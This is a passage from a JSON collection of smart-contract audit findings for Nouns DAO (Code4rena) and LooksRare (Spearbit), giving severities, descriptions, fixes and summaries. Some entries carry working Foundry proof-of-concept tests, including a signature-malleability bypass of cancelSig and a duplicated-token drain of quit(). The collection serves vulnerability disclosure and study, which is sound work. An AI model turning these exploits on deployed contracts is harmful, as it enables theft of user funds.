isForkPeriodActive from withdrawFromForkEscrow to returnTokensToOwner.\n\n**[eladmallel (Nouns DAO) acknowledged](https://github.com/code-423n4/2023-07-nounsdao-findings/issues/56#issuecomment-1650607685)**\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a potential issue with the Nouns DAO platform. During the escrow period, users can escrow to or withdraw from forkEscrow their Nouns. If a proposal is executed that changes ds.forkEscrow, the user's escrowed Nouns will not be withdrawn by withdrawFromForkEscrow. This is because withdrawFromForkEscrow only calls the returnTokensToOwner function of ds.forkEscrow, and returnTokensToOwner is only allowed to be called by DAO.\n\nTo prove this, the report provides three Github links to the Nouns DAO contracts. The recommended mitigation step is to allow the user to call forkEscrow.returnTokensToOwner directly to withdraw escrowed Nouns, and move isForkPeriodActive from withdrawFromForkEscrow to returnTokensToOwner. This bug report has been acknowledged by eladmallel (Nouns DAO).",
      "quality_score": 0,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nouns DAO",
      "source_link": "https://code4rena.com/reports/2023-07-nounsdao",
      "github_link": "https://github.com/code-423n4/2023-07-nounsdao-findings/issues/56",
      "tags": [
        "Fund Lock",
        "Business Logic"
      ],
      "finders": [
        "cccz"
      ]
    },
    {
      "id": "20190",
      "title": "[M-01] `cancelSig` will not completely cancel signatures due to malleability vulnerabilities",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOV3Proposals.sol#L270-L275><br>\n<https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOV3Proposals.sol#L983>\n\nThe current version of openzeppelin contracts has a high risk of vulnerability about signature malleability attack: <https://github.com/OpenZeppelin/openzeppelin-contracts/pull/3610>.\n\nSo if the signer only cancel one signature, the malicious proposer can still extend a fully valid signature through the previous signature to pass the proposal.\n\n### Proof of Concept\n<details>\n \n```solidity\n// CancelProposalBySigs.t.sol\ncontract TestSignatureMalleabilityAttack is ZeroState {\n    function setUp() public virtual override {\n        super.setUp();\n\n        (signerWithVote, signerWithVotePK) = makeAddrAndKey('signerWithVote');\n\n        vm.startPrank(minter);\n        nounsToken.mint();\n        nounsToken.transferFrom(minter, signerWithVote, 1);\n        vm.roll(block.number + 1);\n        vm.stopPrank();\n\n        NounsDAOV3Proposals.ProposalTxs memory txs = makeTxs(makeAddr('target'), 0, '', '');\n        uint256 expirationTimestamp = block.timestamp + 1234;\n        NounsDAOStorageV3.ProposerSignature[] memory proposerSignatures = new NounsDAOStorageV3.ProposerSignature[](1);\n        bytes memory signature = signProposal(proposer, signerWithVotePK, txs, 'description', expirationTimestamp, address(dao));\n        vm.prank(signerWithVote);\n        dao.cancelSig(signature);\n\n        proposerSignatures[0] = NounsDAOStorageV3.ProposerSignature(\n            signature,\n            signerWithVote,\n            expirationTimestamp\n        );\n        vm.expectRevert(abi.encodeWithSelector(NounsDAOV3Proposals.SignatureIsCancelled.selector));\n        vm.prank(proposer);\n        proposalId = dao.proposeBySigs(\n            proposerSignatures,\n            txs.targets,\n            txs.values,\n            txs.signatures,\n            txs.calldatas,\n            'description'\n        );\n\n        proposerSignatures[0] = NounsDAOStorageV3.ProposerSignature(\n            to2098Format(signature),\n            signerWithVote,\n            expirationTimestamp\n        );\n        vm.prank(proposer);\n        proposalId = dao.proposeBySigs(\n            proposerSignatures,\n            txs.targets,\n            txs.values,\n            txs.signatures,\n            txs.calldatas,\n            'description'\n        );\n\n        vm.roll(block.number + 1);\n\n        assertEq(uint256(dao.state(proposalId)), uint256(NounsDAOStorageV3.ProposalState.Updatable));\n    }\n\n    // Copy from https://github.com/pcaversaccio/malleable-signatures/blob/1f618f556c0af48c44d27c7dbf1f97dc898ceda9/test/SignatureMalleability.t.sol#L78\n    error InvalidSignatureLength();\n    error InvalidSignatureSValue();\n    function to2098Format(bytes memory signature) internal view returns (bytes memory) {\n        if (signature.length != 65) revert InvalidSignatureLength();\n        if (uint8(signature[32]) >> 7 == 1) revert InvalidSignatureSValue();\n        bytes memory short = slice(signature, 0, 64);\n        uint8 parityBit = uint8(short[32]) | ((uint8(signature[64]) % 27) << 7);\n        short[32] = bytes1(parityBit);\n        return short;\n    }\n\n    // Copy from https://github.com/GNSPS/solidity-bytes-utils/blob/6458fb2780a3092bc756e737f246be1de6d3d362/contracts/BytesLib.sol#L228\n    function slice(\n        bytes memory _bytes,\n        uint256 _start,\n        uint256 _length\n    )\n        internal\n        pure\n        returns (bytes memory)\n    {\n        require(_length + 31 >= _length, \"slice_overflow\");\n        require(_bytes.length >= _start + _length, \"slice_outOfBounds\");\n\n        bytes memory tempBytes;\n\n        assembly {\n            switch iszero(_length)\n            case 0 {\n                // Get a location of some free memory and store it in tempBytes as\n                // Solidity does for memory variables.\n                tempBytes := mload(0x40)\n\n                // The first word of the slice result is potentially a partial\n                // word read from the original array. To read it, we calculate\n                // the length of that partial word and start copying that many\n                // bytes into the array. The first word we copy will start with\n                // data we don't care about, but the last `lengthmod` bytes will\n                // land at the beginning of the contents of the new array. When\n                // we're done copying, we overwrite the full first word with\n                // the actual length of the slice.\n                let lengthmod := and(_length, 31)\n\n                // The multiplication in the next line is necessary\n                // because when slicing multiples of 32 bytes (lengthmod == 0)\n                // the following copy loop was copying the origin's length\n                // and then ending prematurely not copying everything it should.\n                let mc := add(add(tempBytes, lengthmod), mul(0x20, iszero(lengthmod)))\n                let end := add(mc, _length)\n\n                for {\n                    // The multiplication in the next line has the same exact purpose\n                    // as the one above.\n                    let cc := add(add(add(_bytes, lengthmod), mul(0x20, iszero(lengthmod))), _start)\n                } lt(mc, end) {\n                    mc := add(mc, 0x20)\n                    cc := add(cc, 0x20)\n                } {\n                    mstore(mc, mload(cc))\n                }\n\n                mstore(tempBytes, _length)\n\n                //update free-memory pointer\n                //allocating the array padded to 32 bytes like the compiler does now\n                mstore(0x40, and(add(mc, 31), not(31)))\n            }\n            //if we want a zero-length slice let's just return a zero-length array\n            default {\n                tempBytes := mload(0x40)\n                //zero out the 32 bytes slice we are about to return\n                //we need to do it because Solidity does not garbage collect\n                mstore(tempBytes, 0)\n\n                mstore(0x40, add(tempBytes, 0x20))\n            }\n        }\n\n        return tempBytes;\n    }\n\n    function testAttack() public {}\n}\n```\n\n```shell\nforge test --match-test testAttack -vvvv --ffi\n```\n\n</details>\n\n### Tools Used\n\nFoundry\n\n### Recommended Mitigation Steps\n\nUpdate openzeppelin contracts to the new version.\n\n**[eladmallel (Nouns DAO) confirmed, but disagreed with severity and commented](https://github.com/code-423n4/2023-07-nounsdao-findings/issues/198#issuecomment-1644632754):**\n > Fix PR here: https://github.com/nounsDAO/nouns-monorepo/pull/761\n> \n> However, think severity should not be high. The worst case here is a signature abuse leads to a proposal going on chain, still subject to the proposal lifecycle, including quorum and voting.\n\n**[davidbrai (Nouns DAO) commented](https://github.com/code-423n4/2023-07-nounsdao-findings/issues/198#issuecomment-1645332715):**\n > Another point regarding severity:<br>\n> The signer can also move their tokens to another address as a way to make the previous signature not useful.\n\n**[gzeon (judge) decreased severity to Low and commented](https://github.com/code-423n4/2023-07-nounsdao-findings/issues/198#issuecomment-1647352618):**\n > Downgrading to Low since no asset will be at risk and require a user error.\n\n**[gzeon (judge) increased severity to Medium and commented](https://github.com/code-423n4/2023-07-nounsdao-findings/issues/198#issuecomment-1650631261):**\n > It is worth to note this is atypical in Code4rena judging, and should not be considered as a precedence for future contests. [Signature malleability](https://gist.github.com/CloudEllie/deb7d1c9c91b605555cbe604662e58cf#low5-use-of-ecrecover-is-susceptible-to-signature-malleability), or [outdated OZ dependency](https://gist.github.com/CloudEllie/deb7d1c9c91b605555cbe604662e58cf#low25-upgrade-openzeppelin-contract-dependency) are generally considered as out-of-scope in C4 contests as they are covered by the bot report. This report is special in the sense that while the project already used the recommended OZ ECDSA library, the specific version they used contained a bug that allow malleability, which the warden provided a POC with meaningful impact. I am keeping this as Medium risk for the above reason and sponsor opinion.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the Nouns DAO project related to signature malleability. This vulnerability is related to the current version of openzeppelin contracts, which has a high risk of signature malleability attack. The vulnerability allows a malicious proposer to extend a fully valid signature and pass the proposal, even if the signer cancels one signature.\n\nThe bug was tested using Foundry. The recommended mitigation steps are to update openzeppelin contracts to the new version. Initially, the severity of the bug was judged as High, but was later downgraded to Low since it requires a user error and no asset will be at risk. However, it was later increased to Medium due to the sponsor's opinion, as this report is special in the sense that while the project already used the recommended OZ ECDSA library, the specific version they used contained a bug that allowed malleability.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nouns DAO",
      "source_link": "https://code4rena.com/reports/2023-07-nounsdao",
      "github_link": "https://github.com/code-423n4/2023-07-nounsdao-findings/issues/198",
      "tags": [
        "Signature Malleability"
      ],
      "finders": [
        "kutugu"
      ]
    },
    {
      "id": "20189",
      "title": "[H-01] User can steal tokens by using duplicated ERC20 tokens as parameter in `NounsDAOLogicV1Fork.quit`",
      "impact": "HIGH",
      "content": "\nCalling [NounsDAOLogicV1Fork.quit](https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/fork/newdao/governance/NounsDAOLogicV1Fork.sol#L206-L216) by using dupliated ERC20 tokens, malicious user can gain more ERC20 tokens than he/she is supposed to, even drain all ERC20 tokens.\n\n### Proof of Concept\n\nIn function, [NounsDAOLogicV1Fork.quit](https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/fork/newdao/governance/NounsDAOLogicV1Fork.sol#L206-L216), `erc20TokensToInclude` is used to specified tokens a user wants to get, but since the function doesn't verify if `erc20TokensToInclude` contains dupliated tokens, it's possible that a malicious user calls the function by specify the ERC20 more than once to get more share tokens.\n\n```solidity\n    function quit(uint256[] calldata tokenIds, address[] memory erc20TokensToInclude) external nonReentrant {\n        // check that erc20TokensToInclude is a subset of `erc20TokensToIncludeInQuit`\n        address[] memory erc20TokensToIncludeInQuit_ = erc20TokensToIncludeInQuit;\n        for (uint256 i = 0; i < erc20TokensToInclude.length; i++) {\n            if (!isAddressIn(erc20TokensToInclude[i], erc20TokensToIncludeInQuit_)) {\n                revert TokensMustBeASubsetOfWhitelistedTokens();\n            }\n        }\n\n        quitInternal(tokenIds, erc20TokensToInclude);\n    }\n\n    function quitInternal(uint256[] calldata tokenIds, address[] memory erc20TokensToInclude) internal {\n        checkGovernanceActive();\n\n        uint256 totalSupply = adjustedTotalSupply();\n\n        for (uint256 i = 0; i < tokenIds.length; i++) {\n            nouns.transferFrom(msg.sender, address(timelock), tokenIds[i]);\n        }\n\n        uint256[] memory balancesToSend = new uint256[](erc20TokensToInclude.length);\n\n        // Capture balances to send before actually sending them, to avoid the risk of external calls changing balances.\n        uint256 ethToSend = (address(timelock).balance * tokenIds.length) / totalSupply;\n        for (uint256 i = 0; i < erc20TokensToInclude.length; i++) {\n            IERC20 erc20token = IERC20(erc20TokensToInclude[i]);\n            balancesToSend[i] = (erc20token.balanceOf(address(timelock)) * tokenIds.length) / totalSupply;\n        }\n\n        // Send ETH and ERC20 tokens\n        timelock.sendETH(payable(msg.sender), ethToSend);\n        for (uint256 i = 0; i < erc20TokensToInclude.length; i++) {\n            if (balancesToSend[i] > 0) {\n                timelock.sendERC20(msg.sender, erc20TokensToInclude[i], balancesToSend[i]);\n            }\n        }\n\n        emit Quit(msg.sender, tokenIds);\n    }\n```\n\nAdd the following code in test/foundry/governance/fork/NounsDAOLogicV1Fork.t.sol file `NounsDAOLogicV1Fork_Quit_Test` contract,\nand run `forge test --ffi --mt test_quit_allowsChoosingErc20TokensToIncludeTwice`.\n\n```solidity\n    function test_quit_allowsChoosingErc20TokensToIncludeTwice() public {\n        vm.prank(quitter);\n        address[] memory tokensToInclude = new address[](3);\n        //****************************\n        // specify token2 three times\n        //****************************\n        tokensToInclude[0] = address(token2);\n        tokensToInclude[1] = address(token2);\n        tokensToInclude[2] = address(token2);\n        dao.quit(quitterTokens, tokensToInclude);\n\n        assertEq(quitter.balance, 24 ether);\n        assertEq(token1.balanceOf(quitter), 0);\n        //****************************\n        // get 3 time tokens\n        //****************************\n        assertEq(token2.balanceOf(quitter), 3 * (TOKEN2_BALANCE * 2) / 10);\n     }\n```\n\n### Tools Used\n\nVS\n\n### Recommended Mitigation Steps\n\nBy using function `checkForDuplicates` to prevent the issue\n\n```diff\n--- NounsDAOLogicV1Fork.sol\t2023-07-12 21:32:56.925848531 +0800\n+++ NounsDAOLogicV1ForkNew.sol\t2023-07-12 21:32:34.006158294 +0800\n@@ -203,8 +203,9 @@\n         quitInternal(tokenIds, erc20TokensToIncludeInQuit);\n     }\n \n-    function quit(uint256[] calldata tokenIds, address[] memory erc20TokensToInclude) external nonReentrant {\n+    function quit(uint256[] calldata tokenIds, address[] memory erc20tokenstoinclude) external nonReentrant {\n         // check that erc20TokensToInclude is a subset of `erc20TokensToIncludeInQuit`\n+        checkForDuplicates(erc20tokenstoinclude);\n         address[] memory erc20TokensToIncludeInQuit_ = erc20TokensToIncludeInQuit;\n         for (uint256 i = 0; i < erc20TokensToInclude.length; i++) {\n             if (!isAddressIn(erc20TokensToInclude[i], erc20TokensToIncludeInQuit_)) {\n\n```\n\n**[eladmallel (Nouns DAO) confirmed and commented](https://github.com/code-423n4/2023-07-nounsdao-findings/issues/102#issuecomment-1644585861):**\n > Fix PR: https://github.com/nounsDAO/nouns-monorepo/pull/762\n\n**[gzeon (judge) increased severity to High](https://github.com/code-423n4/2023-07-nounsdao-findings/issues/102#issuecomment-1647519228)**\n\n\n\n***\n\n \n",
      "summary": "\nA bug report has been identified in the NounsDAO smart contract, which is a part of the NounsDAO monorepo. The bug is found in the function NounsDAOLogicV1Fork.quit. This function allows a user to specify ERC20 tokens they want to get, but it does not verify if the specified ERC20 tokens contain duplicates. This means that a malicious user can call the function with duplicated tokens and gain more ERC20 tokens than they are supposed to, or even drain all the ERC20 tokens. \n\nTo demonstrate the bug, a Proof of Concept was provided. It showed that a malicious user can specify the same ERC20 token multiple times to get more share tokens. A code was also provided to test the bug, which was then run using the command `forge test --ffi --mt test_quit_allowsChoosingErc20TokensToIncludeTwice`.\n\nThe recommended mitigation step to fix this bug is to use the function `checkForDuplicates` to prevent the issue. A Fix PR was also provided, which is located at https://github.com/nounsDAO/nouns-monorepo/pull/762. The severity of the bug was increased to High.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nouns DAO",
      "source_link": "https://code4rena.com/reports/2023-07-nounsdao",
      "github_link": "https://github.com/code-423n4/2023-07-nounsdao-findings/issues/102",
      "tags": [
        "Array"
      ],
      "finders": [
        "iglyx",
        "said",
        "jasonxiale",
        "shark",
        "0xG0P1",
        "0xA5DF"
      ]
    },
    {
      "id": "6992",
      "title": "Incorrect isMakerBidValid logic in ItemIdsRange execution strategy",
      "impact": "LOW",
      "content": "## Severity: Low Risk\n\n## Context\n`StrategyItemIdsRange.sol#L115`\n\n## Description\nIf an ItemIdsRange order has `makerBid.itemIds[0] == 0`, it is treated as invalid by the corresponding `isMakerBidValid` function. Since `makerBid.itemIds[0]` is the `minItemId` value, and since many NFT collections contain NFTs with ID 0, this is incorrect (and does not match the logic of the `ItemIdsRange` `executeStrategyWithTakerAsk` function).\n\nAs a consequence, frontends that filter orders based on the `isMakerBidValid` function will ignore certain orders, even though they are valid.\n\n## Recommendation\nChanging the check to `makerBid.itemIds[1] == 0` is one possible fix since an order with `maxItemId` of 0 is certainly invalid (as `minItemId` can't possibly be smaller than it). However, `minItemId >= maxItemId` is already checked later on in the function, so it is recommended to simply remove the check altogether:\n\n```solidity\n-if (makerBid.itemIds.length != 2 || makerBid.amounts.length != 1 || makerBid.itemIds[0] == 0) {\n+if (makerBid.itemIds.length != 2 || makerBid.amounts.length != 1) {\nreturn (isValid, OrderInvalid.selector);\n}\n```\n\n## Additional Information\n**LooksRare:** Fixed in PR 304.  \n**Spearbit:** Verified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "LOOKSRARE",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Saw-Mon and Natalie",
        "Riley Holterhus",
        "Optimum",
        "Maxime Viard"
      ]
    },
    {
      "id": "6991",
      "title": "The price calculation in StrategyDutchAuction can be more accurate",
      "impact": "LOW",
      "content": "## Severity: Low Risk\n\n## Context\n- **File:** StrategyDutchAuction.sol\n- **Lines:** L67-L71\n\n## Description\nThe `StrategyDutchAuction` calculates the auction price as follows:\n\n```solidity\nuint256 duration = makerAsk.endTime - makerAsk.startTime;\nuint256 decayPerSecond = (startPrice - makerAsk.minPrice) / duration;\nuint256 elapsedTime = block.timestamp - makerAsk.startTime;\nprice = startPrice - elapsedTime * decayPerSecond;\n```\n\nOne of the shortcomings of the above calculation is that division comes before multiplication, which can amplify the error due to division.\n\n## Recommendation\nIt is recommended to perform the price calculation as shown below:\n\n```solidity\n{\n    uint256 startTime = makerAsk.startTime;\n    uint256 endTime = makerAsk.endTime;\n    price = (\n        (endTime - block.timestamp) * startPrice +\n        (block.timestamp - startTime) * makerAsk.minPrice\n    ) / (endTime - startTime);\n}\n```\n\n## Additional Information\n- **LooksRare:** Fixed in PR 309.\n- **Spearbit:** Verified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "LOOKSRARE",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Saw-Mon and Natalie",
        "Riley Holterhus",
        "Optimum",
        "Maxime Viard"
      ]
    },
    {
      "id": "6990",
      "title": "Owner of strategies that inherit from BaseStrategyChainlinkMultiplePriceFeeds can add malicious price feeds after they have been added to LooksRareProtocol",
      "impact": "LOW",
      "content": "## Severity: Low Risk\n\n## Context\n- **File:** BaseStrategyChainlinkMultiplePriceFeeds.sol  \n- **Line:** 49\n\n## Description\nThe owner of strategies that inherit from `BaseStrategyChainlinkMultiplePriceFeeds` can add malicious price feeds for new collections after they have been added to `LooksRareProtocol`. It's also important to note that these strategy owners might not necessarily be the same owner as the `LooksRareProtocol`.\n\n1. `LooksRareProtocol`'s owner (O) adds strategy S.\n2. Strategy's owner (OS) adds a malicious price feed for a new collection T.\n\n## Recommendation\nIt would be best to enforce that owners of contracts inherited from `BaseStrategyChainlinkMultiplePriceFeeds` are the same as `LooksRareProtocol`'s (O=OS) or to make sure that `LooksRareProtocol`'s owner is the only entity that can add new price feeds.\n\nNote that the protocol owner can always deactivate the strategy after the fact by toggling its `isActive` field.\n\n## Acknowledgments\n- **LooksRare:** Acknowledged as a risk but will not adjust.\n- **Spearbit:** Acknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "LOOKSRARE",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Saw-Mon and Natalie",
        "Riley Holterhus",
        "Optimum",
        "Maxime Viard"
      ]
    },
    {
      "id": "6989",
      "title": "Spec mismatch - StrategyCollectionOffer allows the only single item orders where the spec states it should allow anyamount",
      "impact": "LOW",
      "content": "## Severity: Low Risk\n\n## Context\n- `StrategyCollectionOffer.sol#L46`\n- `StrategyCollectionOffer.sol#L87`\n\n## Description\nThe functions `executeCollectionStrategyWithTakerAsk` and `executeCollectionStrategyWithTakerAskWith- Proof` only allow the transfer of a single ERC721/ERC1155 item, although the specification states it should support any amount.\n\n## Recommendation\nWhile it might be just an oversight or an unclear requirement in the specification, make sure that the spec is aligned with the actual implementation.\n\n## LooksRare\nFixed in PR 347.\n\n## Spearbit\nVerified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "LOOKSRARE",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Saw-Mon and Natalie",
        "Riley Holterhus",
        "Optimum",
        "Maxime Viard"
      ]
    },
    {
      "id": "6988",
      "title": "The ItemIdsRange strategy allows for length mismatch in itemIds and amounts",
      "impact": "LOW",
      "content": "## Severity: Low Risk\n\n## Context\n`StrategyItemIdsRange.sol#L94`\n\n## Description\nThere is no validation that `takerAsk.itemIds.length == takerAsk.amounts.length` in the ItemIdsRange strategy, despite `takerAsk.itemIds` and `takerAsk.amounts` being the return values of the `executeStrategyWithTakerAsk` function. If `takerAsk.itemIds.length > takerAsk.amounts.length`, then the transaction will revert anyways when it attempts to read an index out of bounds in the main loop.\n\nHowever, there is nothing causing a revert if `takerAsk.itemIds.length < takerAsk.amounts.length`, and any extra values in the `takerAsk.amounts` array will be ignored. Most likely this issue would be caught later on in any transaction, e.g., the current TransferManager implementation checks for length mismatches. However, this TransferManager is just one possible implementation that could be added to the TransferSelectorNFT contract, so this still could be an issue.\n\n## Recommendation\nAdd an explicit check for length mismatches on the `takerAsk.itemIds` and `takerAsk.amounts` arrays:\n\n```solidity\nif (makerBid.itemIds.length != 2 || makerBid.amounts.length != 1) {\n    revert OrderInvalid();\n}\nif (takerAsk.itemIds.length != takerAsk.amounts.length) {\n    revert OrderInvalid();\n}\n```\n\n## LooksRare\nFixed in PR 318 and also in the Taker rewrite PR 383\n\n## Spearbit\nVerified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "LOOKSRARE",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Saw-Mon and Natalie",
        "Riley Holterhus",
        "Optimum",
        "Maxime Viard"
      ]
    },
    {
      "id": "6987",
      "title": "Makers can sign (or be tricked into signing) collection of orders (using the merkle tree mechanism) that cannot be entirely canceled.",
      "impact": "LOW",
      "content": "## Severity: Low Risk\n\n## Context\n- LooksRareProtocol.sol#L126\n- LooksRareProtocol.sol#L151\n- LooksRareProtocol.sol#L206\n- LooksRareProtocol.sol#L567\n\n## Description\nAll user-facing order execution endpoints of the protocol check whether the order hash is included in the merkle tree data provided by the caller. If it is, the maker/signer is only required to sign the hash of the tree's root.\n\nA maker might sign (or get tricked into signing) a root that belongs to trees with a high number of leaves such that the leaves each encode an order with:\n- Different `subsetNonce` and `orderNonce` (this would require canceling each nonce individually if the relevant endpoints are used).\n- `askNonce` or `bidNonce` that form a consecutive array of integers (1, 2, 3, ..., n) (this would require incrementing these nonces at least n times, if this method was used as a way of canceling the orders).\n\nTo cancel these orders, the maker would need to call the `cancelOrderNonces`, `cancelSubsetNonces`, or `incrementBidAskNonces`. If the tree has a high number of nodes, it might be infeasible to cancel all the orders due to gas costs. The maker would be forced to remove its token approvals (if it's not a custom EIP-1271 maker/signer) and not use that address again to interact with the protocol.\n\n## Recommendation\nThe order cancellation through the different nonce setup fails in the above context because there is no limit on the depth/height of the merkle tree. To mitigate this, it would be best to define an upper bound based on some gas analysis (cost of cancellation) on the depth of the tree. Additionally, in case different `subsetNonce`, `orderNonce`, `askNonce`, or `bidNonce` are used for each order included in the tree (like the example above), to cancel all orders in one shot, we could allow `incrementBidAskNonces` to increment the `askNonce` or `bidNonce` by a random number that would be greater than the maximum number of orders that would be allowed for the biggest tree.\n\n## LooksRare\nFixed in PR 357, PR 372, PR 422, PR 430 and PR 440.\n\n## Spearbit\nVerified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "LOOKSRARE",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Saw-Mon and Natalie",
        "Riley Holterhus",
        "Optimum",
        "Maxime Viard"
      ]
    },
    {
      "id": "6986",
      "title": "The returned price by strategies are not validated",
      "impact": "LOW",
      "content": "## Security Analysis\n\n## Severity\n**Low Risk**\n\n## Context\n- ExecutionManager.sol#L135\n- ExecutionManager.sol#L221\n\n## Description\nWhen a taker submits an order to be executed, the returned price by the maker's chosen strategy is not validated. The current strategies do have the validations implemented. However, the general upper and lower bound price validation needs to be in the protocol contract itself, since the price calculation in a potential strategy might be a complex matter that cannot be easily verified by a maker or a taker.\n\n## Related Issue\n* \"Price validation in `executeStrategyWithTakerAsk`, `executeCollectionStrategyWithTakerAsk`, and `executeCollectionStrategyWithTakerAskWithProof` can be relaxed\"\n\n## Recommendation\nCompare the returned price by strategies in LooksRareProtocol to the minimum and maximum price provided by the makers and takers, ensuring it is within the correct range. This validation should be refactored out of strategies and delegated directly in the protocol.\n\n```solidity\nif (makerXXX.strategyId == 0) {\n    ...\n} else {\n    if (strategyInfo[makerXXX.strategyId].isActive) {\n        ...\n    } else {\n        revert StrategyNotAvailable(makerXXX.strategyId);\n    }\n}\n\n// Validate returned price here\n// `maxPrice` and `minPrice` are defined based on whether it's a TakerAsk or TakerBid\nif (price > maxPrice || price < minPrice) {\n    revert ...;\n}\n```\n\nThe above validation indirectly also implies that `minPrice <= maxPrice`.\n\n## Responses\n**LooksRare:** Acknowledged but will not be adjusted. Checks are likely to exist on other parts of the app to reject some extreme prices.\n\n**Spearbit:** Acknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "LOOKSRARE",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Saw-Mon and Natalie",
        "Riley Holterhus",
        "Optimum",
        "Maxime Viard"
      ]
    },
    {
      "id": "6985",
      "title": "Protocol fees will be sent to address(0) ifprotocolFeeRecipient is not set.",
      "impact": "LOW",
      "content": "## Security Assessment Report\n\n## Severity: Low Risk\n\n### Context\n- **File:** LooksRareProtocol.sol\n  - **Line:** 452\n- **File:** ExecutionManager.sol\n  - **Line:** 43\n\n### Description\nProtocol fees will be sent to `address(0)` if `protocolFeeRecipient` is not set.\n\n### Recommendation\n- Either add a check before `_transferFungibleTokens` to ensure fees are only sent if `protocolFeeRecipient` is not `address(0)`, or enforce that `protocolFeeRecipient` is set in `ExecutionManager`'s constructor.\n\n### Status\n- **LooksRare:** Fixed in PR 349.\n- **Spearbit:** Verified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "LOOKSRARE",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Saw-Mon and Natalie",
        "Riley Holterhus",
        "Optimum",
        "Maxime Viard"
      ]
    },
    {
      "id": "6984",
      "title": "TransferSelectorNFT does not emit events when new transfer managers are added in its constructor",
      "impact": "LOW",
      "content": "## Severity: Low Risk\n\n## Context\n- TransferSelectorNFT.sol#L28-L32\n\n## Description\nTransferSelectorNFT does not emit an event when assetTypes of 0 and 1 are added in its constructor.\n\n## Recommendation\nTo make it easier for off-chain agents' data lookup, it would be best to emit `NewAssetType` every time a new transfer manager is added.\n\n```solidity\nconstructor(address _owner, address transferManager) ExecutionManager(_owner) {\n    // Transfer manager with selectors for ERC721/ERC1155\n    managerSelectorOfAssetType[0] = ManagerSelector({transferManager: transferManager, selector: 0xa7bc96d3});\n    managerSelectorOfAssetType[1] = ManagerSelector({transferManager: transferManager, selector: 0xa0a406c6});\n    emit NewAssetType(0, transferManager, 0xa7bc96d3);\n    emit NewAssetType(1, transferManager, 0xa0a406c6);\n}\n```\n\n## LooksRare\nNot necessary anymore since adding new asset types has been removed in PR 308.\n\n## Spearbit\nVerified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "LOOKSRARE",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Saw-Mon and Natalie",
        "Riley Holterhus",
        "Optimum",
        "Maxime Viard"
      ]
    },
    {
      "id": "6983",
      "title": "StrategyManager does not emit an event when the first strategy gets added.",
      "impact": "LOW",
      "content": "## Severity: Low Risk\n\n## Context\n- `StrategyManager.sol#L32-L42`\n\n## Description\n`StrategyManager` does not emit an event when the first strategy gets added, which can cause issues for off-chain agents.\n\n## Recommendation\nTo make it easier for off-chain agents' data lookup, it would be great to ensure that the `NewStrategy` event is emitted when the first strategy is added in `StrategyManager`'s constructor.\n\n```solidity\nconstructor(address _owner) CurrencyManager(_owner) {\n    strategyInfo[0] = Strategy({\n        isActive: true,\n        standardProtocolFeeBp: 150,\n        minTotalFeeBp: 200,\n        maxProtocolFeeBp: 300,\n        selector: bytes4(0),\n        isMakerBid: false,\n        implementation: address(0)\n    });\n    emit NewStrategy(\n        0,\n        150,\n        200,\n        300,\n        bytes4(0),\n        false,\n        address(0)\n    );\n}\n```\n\n## LooksRare\nFixed in PR 313.\n\n## Spearbit\nVerified.",
      "summary": "",
      "quality_score": 0,
